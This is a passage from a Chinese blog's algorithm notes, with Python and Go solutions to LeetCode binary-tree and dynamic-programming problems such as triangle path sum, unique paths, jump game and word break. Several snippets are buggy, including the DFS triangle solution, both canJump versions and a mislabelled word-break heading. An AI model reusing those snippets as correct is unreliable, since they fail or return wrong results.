<h1 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isBalanced</span><span class="params">(self, root: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> self.compare(root)&lt;<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compare</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        left=self.compare(root.left)</span><br><span class="line">        right=self.compare(root.right)</span><br><span class="line">        <span class="keyword">if</span> left&gt;=<span class="number">0</span> <span class="keyword">and</span> right&gt;=<span class="number">0</span> <span class="keyword">and</span> abs(left-right)&lt;=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> max(left,right)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>

<h1 id="二叉搜索树与双向循环链表"><a href="#二叉搜索树与双向循环链表" class="headerlink" title="二叉搜索树与双向循环链表"></a>二叉搜索树与双向循环链表</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, val, left=None, right=None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeToDoublyList</span><span class="params">(self, root: <span class="string">'Node'</span>)</span> -&gt; 'Node':</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root: <span class="keyword">return</span> root</span><br><span class="line">        stack=[]</span><br><span class="line">        prev=<span class="literal">None</span></span><br><span class="line">        head=<span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> stack <span class="keyword">or</span> root:</span><br><span class="line">            <span class="keyword">while</span> root:</span><br><span class="line">                stack.append(root)</span><br><span class="line">                root=root.left</span><br><span class="line">            node=stack.pop()</span><br><span class="line">            root=node.right</span><br><span class="line">            <span class="keyword">if</span> prev==<span class="literal">None</span>:</span><br><span class="line">                head=node</span><br><span class="line">                prev=head</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                prev.right=node</span><br><span class="line">                node.left=prev</span><br><span class="line">                prev=node</span><br><span class="line">        head.left=prev</span><br><span class="line">        prev.right=head</span><br><span class="line">        <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 动态规划练习</title>
    <url>/2020/08/02/2020-08-02-DP-1/</url>
    <content><![CDATA[<p>非常好的题解</p>
<p><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/solution/dong-tai-gui-hua-she-ji-fang-fa-zhi-pai-you-xi-jia/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-increasing-subsequence/solution/dong-tai-gui-hua-she-ji-fang-fa-zhi-pai-you-xi-jia/</a></p>
<h1 id="三角形入门"><a href="#三角形入门" class="headerlink" title="三角形入门"></a>三角形入门</h1><p><a href="https://leetcode-cn.com/problems/triangle/" target="_blank" rel="noopener">三角形最小路径和</a></p>
<p>给定一个三角形，找出自顶向下的最小路径和。每一步只能移动到下一行中相邻的结点上。</p>
<p>相邻的结点 在这里指的是 下标 与 上一层结点下标 相同或者等于 上一层结点下标 + 1 的两个结点    。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''方法1=深搜'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minimumTotal</span><span class="params">(self, triangle: List[List[int]])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> triangle==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        minmum=<span class="number">0</span></span><br><span class="line">        l=len(triangle)<span class="number">-1</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,suma)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> i==l <span class="keyword">and</span> suma&lt;minmum:</span><br><span class="line">                minmum=suma</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            dfs(i+<span class="number">1</span>,j,suma+triangle[i][j])</span><br><span class="line">            dfs(i+<span class="number">1</span>,j+<span class="number">1</span>,suma+triangle[i][j])</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> minmum</span><br><span class="line"><span class="string">'''方法2=分治法'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minimumTotal</span><span class="params">(self, triangle: List[List[int]])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> triangle==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        l=len(triangle)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> i==l: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> min(dfs(i+<span class="number">1</span>,j),dfs(i+<span class="number">1</span>,j+<span class="number">1</span>))+triangle[i][j]</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>动态规划，自底向上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minimumTotal</span><span class="params">(self, triangle: List[List[int]])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> triangle==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(triangle)<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(triangle[i])):</span><br><span class="line">                triangle[i][j]=min(triangle[i+<span class="number">1</span>][j],triangle[i+<span class="number">1</span>][j+<span class="number">1</span>])+triangle[i][j]</span><br><span class="line">        <span class="comment"># print(triangle)</span></span><br><span class="line">        <span class="keyword">return</span> triangle[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>动态规划，自顶向下（不比自底向上优雅）</p>
<ul>
<li>从上往下走，算到最后一层</li>
<li>由于下面一层比上面一层大，所以需要考虑左右的边界情况</li>
<li>然后遍历最后一层，找最小值返回</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minimumTotal</span><span class="params">(self, triangle: List[List[int]])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> triangle==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(triangle)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(triangle[i])):</span><br><span class="line">                <span class="keyword">if</span> j<span class="number">-1</span>&lt;<span class="number">0</span>:</span><br><span class="line">                    triangle[i][j]=triangle[i<span class="number">-1</span>][j]+triangle[i][j]</span><br><span class="line">                <span class="keyword">elif</span> j+<span class="number">1</span>&gt;=len(triangle[i]):</span><br><span class="line">                    triangle[i][j]=triangle[i<span class="number">-1</span>][j<span class="number">-1</span>]+triangle[i][j]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    triangle[i][j]=min(triangle[i<span class="number">-1</span>][j],triangle[i<span class="number">-1</span>][j<span class="number">-1</span>])+triangle[i][j]</span><br><span class="line">        len_trangle=len(triangle)</span><br><span class="line">        len_trangle2=len(triangle[len_trangle<span class="number">-1</span>])</span><br><span class="line">        res=triangle[len_trangle<span class="number">-1</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len_trangle2):</span><br><span class="line">            res=min(res,triangle[len_trangle<span class="number">-1</span>][i])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>满足两个条件</p>
<ul>
<li>满足以下条件之一<ul>
<li>求最大/最小值（Maximum/Minimum ）</li>
<li>求是否可行（Yes/No ）</li>
<li>求可行个数（Count(*) ）</li>
</ul>
</li>
<li>满足不能排序或者交换（Can not sort / swap ）</li>
</ul>
<h1 id="四个要素"><a href="#四个要素" class="headerlink" title="四个要素"></a>四个要素</h1><ul>
<li>状态：存储小规模问题的结果</li>
<li>方程：状态之间的转移计算</li>
<li>初始化：开始的状态，可以把能算的先算了</li>
<li>答案：最后的状态在哪里？</li>
</ul>
<h1 id="常见四种类型"><a href="#常见四种类型" class="headerlink" title="常见四种类型"></a>常见四种类型</h1><ol>
<li>Matrix DP (10%)</li>
<li>Sequence (40%)</li>
<li>Two Sequences DP (40%)</li>
<li>Backpack (10%)</li>
</ol>
<h1 id="编写时注意事项"><a href="#编写时注意事项" class="headerlink" title="编写时注意事项"></a>编写时注意事项</h1><ul>
<li>可以先创建 dp[n+1] [m+1] 然后，将 dp[0] [i]  dp[i] [0]先设初值了</li>
<li>在算的时候，要做好条件</li>
<li>要注意看是什么类型的dp：矩阵、单序列、双序列、零花钱和背包？</li>
</ul>
<h1 id="1、矩阵类型（10-）"><a href="#1、矩阵类型（10-）" class="headerlink" title="1、矩阵类型（10%）"></a>1、矩阵类型（10%）</h1><h2 id="最小路径和"><a href="#最小路径和" class="headerlink" title="最小路径和"></a>最小路径和</h2><p><a href="https://leetcode-cn.com/problems/minimum-path-sum/" target="_blank" rel="noopener">最小路径和</a></p>
<p>给定一个包含非负整数的 m x n 网格，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。</p>
<p>说明：每次只能向下或者向右移动一步。</p>
<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  [1,3,1],</span><br><span class="line">  [1,5,1],</span><br><span class="line">  [4,2,1]</span><br><span class="line">]</span><br><span class="line">输出: 7</span><br><span class="line">解释: 因为路径 1→3→1→1→1 的总和最小。</span><br></pre></td></tr></table></figure>

<p>使用动态规划</p>
<ul>
<li>由于每次只能向下或者向右移动一步，所以先初始化边缘值</li>
<li>然后从第二行开始，一行行往下刷新</li>
<li>也可以从第二列开始，一行行往下刷新（都能保证某点值依赖的点都备算过）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minPathSum</span><span class="params">(self, grid: List[List[int]])</span> -&gt; int:</span></span><br><span class="line">        n=len(grid)</span><br><span class="line">        m=len(grid[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span> <span class="keyword">or</span> m==<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n): <span class="comment">#初始化边缘值</span></span><br><span class="line">            grid[i][<span class="number">0</span>]=grid[i][<span class="number">0</span>]+grid[i<span class="number">-1</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,m): <span class="comment">#初始化边缘值</span></span><br><span class="line">            grid[<span class="number">0</span>][j]=grid[<span class="number">0</span>][j]+grid[<span class="number">0</span>][j<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,m):</span><br><span class="line">                grid[i][j]=grid[i][j]+min(grid[i<span class="number">-1</span>][j],grid[i][j<span class="number">-1</span>])</span><br><span class="line">        <span class="comment"># print(grid)</span></span><br><span class="line">        <span class="keyword">return</span> grid[n<span class="number">-1</span>][m<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h2><p><a href="https://leetcode-cn.com/problems/unique-paths/" target="_blank" rel="noopener">不同路径</a></p>
<p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。</p>
<p>机器人<strong>每次只能向下或者向右</strong>移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。</p>
<p>问总共有多少条不同的路径？</p>
<p><img src="/2020/08/02/2020-08-02-DP-1/image-20200731163955686.png" alt="image-20200731163955686"></p>
<p>例如，上图是一个7 x 3 的网格。有多少可能的路径？</p>
<p><strong>解题思路：</strong></p>
<ul>
<li>初始化第一行、第一列为1，因为走到他们都只有一种走法</li>
<li>然后从第二行第二行开始遍历，每个走到这些方块的走法，由前两个方块的走法加起来</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uniquePaths</span><span class="params">(self, m: int, n: int)</span> -&gt; int:</span></span><br><span class="line">        dp=[[<span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(m)] <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,m):</span><br><span class="line">                dp[i][j]=dp[i<span class="number">-1</span>][j]+dp[i][j<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][m<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="不同路径-ii"><a href="#不同路径-ii" class="headerlink" title="不同路径-ii"></a>不同路径-ii</h2><p>在上一题基础上，增加了障碍</p>
<p>网格中的障碍物和空位置分别用 <code>1</code> 和 <code>0</code> 来表示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(self, obstacleGrid: List[List[int]])</span> -&gt; int:</span></span><br><span class="line">        n=len(obstacleGrid)</span><br><span class="line">        m=len(obstacleGrid[<span class="number">0</span>])</span><br><span class="line">        dp=[[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(m)] <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n): <span class="comment">#从零开始，防止[0][0]位置的1，直接堵住</span></span><br><span class="line">            <span class="keyword">if</span> obstacleGrid[i][<span class="number">0</span>]==<span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            dp[i][<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,m): <span class="comment">#从零开始，防止[0][0]位置的1，直接堵</span></span><br><span class="line">            <span class="keyword">if</span> obstacleGrid[<span class="number">0</span>][j]==<span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            dp[<span class="number">0</span>][j]=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,m):</span><br><span class="line">                <span class="keyword">if</span> obstacleGrid[i][j]==<span class="number">1</span>: dp[i][j]=<span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>: dp[i][j]=dp[i<span class="number">-1</span>][j]+dp[i][j<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][m<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<h1 id="2、单序列类型（40-）"><a href="#2、单序列类型（40-）" class="headerlink" title="2、单序列类型（40%）"></a>2、单序列类型（40%）</h1><h2 id="跳台阶"><a href="#跳台阶" class="headerlink" title="跳台阶"></a>跳台阶</h2><p><a href="https://leetcode-cn.com/problems/climbing-stairs/" target="_blank" rel="noopener">70. 爬楼梯</a></p>
<p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
<p><strong>注意：</strong>给定 <em>n</em> 是一个正整数。</p>
<p>解：从前到后遍历计算</p>
<p>要注意的初值：0、1、2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">2</span>: <span class="keyword">return</span> n</span><br><span class="line">        dp=[i <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">            dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></figure>

<h2 id="跳跃游戏"><a href="#跳跃游戏" class="headerlink" title="跳跃游戏"></a>跳跃游戏</h2><p><a href="https://leetcode-cn.com/problems/jump-game/" target="_blank" rel="noopener">55. 跳跃游戏</a></p>
<p>给定一个非负整数数组，你最初位于数组的第一个位置。数组中的每个元素代表你在该位置可以跳跃的最大长度。判断你是否能够到达最后一个位置。</p>
<p>示例 1:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>]</span><br><span class="line">输出: true</span><br><span class="line">解释: 我们可以先跳 <span class="number">1</span> 步，从位置 <span class="number">0</span> 到达 位置 <span class="number">1</span>, 然后再从位置 <span class="number">1</span> 跳 <span class="number">3</span> 步到达最后一个位置。</span><br></pre></td></tr></table></figure>

<p>解：</p>
<ul>
<li>遍历每个元素</li>
<li>对于一个元素，要遍历其前面所有元素才能判断</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canJump</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        n=len(nums)</span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        dp=[<span class="literal">False</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,i):</span><br><span class="line">                <span class="keyword">if</span> dp[j]==<span class="literal">True</span> <span class="keyword">and</span> nums[j]+j==i:</span><br><span class="line">                    dp[i]=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<p>但是这样这道题会超时</p>
<p>我们更推荐下面的做法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canJump</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        k=<span class="number">0</span> <span class="comment">#能抵达的最远的距离</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> i&gt;k: <span class="keyword">return</span> <span class="literal">False</span> <span class="comment">#i&gt;k就是判断k是否可以到达i</span></span><br><span class="line">            k=max(k,nums[i]+i) <span class="comment">#不断地找最远的距离</span></span><br><span class="line">        <span class="keyword">return</span> k</span><br></pre></td></tr></table></figure>

<h2 id="跳跃游戏-ii-⭐"><a href="#跳跃游戏-ii-⭐" class="headerlink" title="跳跃游戏-ii ⭐"></a>跳跃游戏-ii ⭐</h2><p>给定一个非负整数数组，你最初位于数组的第一个位置。</p>
<p>数组中的每个元素代表你在该位置可以跳跃的最大长度。</p>
<p>你的目标是使用最少的跳跃次数到达数组的最后一个位置。</p>
<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,3,1,1,4]</span><br><span class="line">输出: 2</span><br><span class="line">解释: 跳到最后一个位置的最小跳跃数是 2。</span><br><span class="line">     从下标为 0 跳到下标为 1 的位置，跳 1 步，然后跳 3 步到达数组的最后一个位置。</span><br></pre></td></tr></table></figure>


<p>说明:</p>
<p>假设你总是可以到达数组的最后一个位置。</p>
<p>解法：还是用动态规划，超时了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jump</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        lenL=len(nums)</span><br><span class="line">        <span class="keyword">if</span> lenL==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        dp=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(lenL)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(lenL):</span><br><span class="line">            dp[i]=i</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,i):</span><br><span class="line">                <span class="keyword">if</span> nums[j]+j&gt;=i: <span class="comment">#nums[j]+j越过了i坐标位置</span></span><br><span class="line">                    dp[i]=min(dp[i],dp[j]+<span class="number">1</span>) <span class="comment">#这里要判断的是，找最小的</span></span><br><span class="line">        <span class="comment"># print(dp)</span></span><br><span class="line">        <span class="keyword">return</span> dp[lenL<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<p>于是我们挨着跳，这叫DP？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jump</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        ans=<span class="number">0</span></span><br><span class="line">        end=<span class="number">0</span></span><br><span class="line">        maxPos=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>): <span class="comment">#遍历</span></span><br><span class="line">            print(i)</span><br><span class="line">            maxPos=max(nums[i]+i,maxPos)<span class="comment">#找最大的区间</span></span><br><span class="line">            <span class="keyword">if</span> i==end: <span class="comment">#如果i等于end，即遍历到了小窗口区间最右边，ans加1</span></span><br><span class="line">                end=maxPos</span><br><span class="line">                ans+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

<p>动态规划加贪心算法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v2 动态规划+贪心优化</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">jump</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    n:=<span class="built_in">len</span>(nums)</span><br><span class="line">    f := <span class="built_in">make</span>([]<span class="keyword">int</span>, n)</span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt; n; i++ &#123;</span><br><span class="line">        <span class="comment">// 取第一个能跳到当前位置的点即可</span></span><br><span class="line">        <span class="comment">// 因为跳跃次数的结果集是单调递增的，所以贪心思路是正确的</span></span><br><span class="line">        idx:=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> idx&lt;n&amp;&amp;idx+nums[idx]&lt;i&#123;</span><br><span class="line">            idx++</span><br><span class="line">        &#125;</span><br><span class="line">        f[i]=f[idx]+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[n<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分割回文串-ii"><a href="#分割回文串-ii" class="headerlink" title="分割回文串-ii"></a>分割回文串-ii</h2><p><a href="https://leetcode-cn.com/problems/word-break" target="_blank" rel="noopener">分割回文串-ii</a></p>
<p>给定一个非空字符串 s 和一个包含非空单词列表的字典 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。</p>
<p>说明：</p>
<p>拆分时可以重复使用字典中的单词。<br>你可以假设字典中没有重复的单词。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;leetcode&quot;, wordDict &#x3D; [&quot;leet&quot;, &quot;code&quot;]</span><br><span class="line">输出: true</span><br><span class="line">解释: 返回 true 因为 &quot;leetcode&quot; 可以被拆分成 &quot;leet code&quot;。</span><br></pre></td></tr></table></figure>

<p>思路：</p>
<ul>
<li>首选做初值，dp[0]=True，这样保证之后的可以好好遍历</li>
<li>最重要的是要有 <code>dp[j] and s[j:i] in wordDict</code> 这个条件的设置能力</li>
<li>然后要会计算 <code>maxLen</code> ，这个是wordDict中最长字符的长度，所以要遍历也要从 <code>i-maxLen</code> 开始（如果i-maxLen不小于零的话）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordBreak</span><span class="params">(self, s: str, wordDict: List[str])</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> s==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        dp=[<span class="literal">False</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)+<span class="number">1</span>)]</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="literal">True</span></span><br><span class="line">        maxLen=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> wordDict:</span><br><span class="line">            <span class="keyword">if</span> len(word)&gt;maxLen: maxLen=len(word)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(max(<span class="number">0</span>,i-maxLen),i):</span><br><span class="line">                <span class="keyword">if</span> dp[j] <span class="keyword">and</span> s[j:i] <span class="keyword">in</span> wordDict:</span><br><span class="line">                    dp[i]=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> dp[len(s)]</span><br></pre></td></tr></table></figure>

<h2 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a>最长上升子序列</h2><p><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/comments/" target="_blank" rel="noopener">最长上升子序列</a></p>
<p>序列类型，大同小异</p>
<p>要注意是这里的上升是严格上升，相同的不算上升</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> nums==[]: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        lenN=len(nums)</span><br><span class="line">        dp=[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(lenN)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(lenN):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,i):</span><br><span class="line">                <span class="keyword">if</span> nums[j]&lt;nums[i]:</span><br><span class="line">                    dp[i]=max(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 